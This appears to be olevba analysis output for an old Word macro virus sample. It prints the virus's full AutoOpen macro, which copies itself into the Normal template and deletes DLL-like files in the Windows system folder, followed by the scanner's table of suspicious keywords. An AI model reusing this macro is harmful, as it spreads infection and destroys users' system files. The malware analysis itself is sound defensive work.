olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.KillDll
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.KillDll - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.KillDll - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim source$
Dim target$
Dim fname$
Dim del$
    source$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)) + ":AutoOpen"
    target$ = WordBasic.[FileName$]() + ":AutoOpen"
    fname$ = WordBasic.[FileName$]()
    WordBasic.FileSaveAs Name:=fname$, Format:=1
    If (InStr(UCase(source$), "NORMAL.DOT") = 0) Then
            WordBasic.MacroCopy source$, "Global:AutoOpen"
    Else
            WordBasic.MacroCopy "Global:AutoOpen", target$
    End If
    del$ = WordBasic.[Files$]("C:\WINDOWS\SYSTEM\*.D??")
    WordBasic.Kill del$
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

